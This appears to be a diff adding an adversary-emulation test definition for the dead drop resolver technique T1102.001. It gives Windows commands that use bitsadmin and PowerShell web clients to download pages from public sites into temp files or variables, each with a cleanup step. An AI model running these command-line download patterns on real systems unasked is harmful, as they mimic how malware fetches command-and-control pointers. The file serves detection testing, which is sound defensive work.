@@ -1,0 +1,29 @@
+attack_technique:
+- T1102.001
+display_name: 'Web Service: Dead Drop Resolver'
+atomic_tests:
+- name: Reach out to C2 Pointer URLs via command_prompt
+  description: |
+    Download data from a public website using command line
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
+    cleanup_command: |
+      del %TEMP%\bitsadmindownload.html >nul 2>&1
+    name: command_prompt
+- name: Reach out to C2 Pointer URLs via powershell
+  description: |
+    Multiple download methods for files using powershell
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Invoke-WebRequest -Uri www.twitter.com
+      $T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
+      $wc = New-Object System.Net.WebClient
+      $T1102 = $wc.DownloadString("https://www.aol.com/")
+    cleanup_command: Clear-Variable T1102 >$null 2>&1
+    name: powershell
+
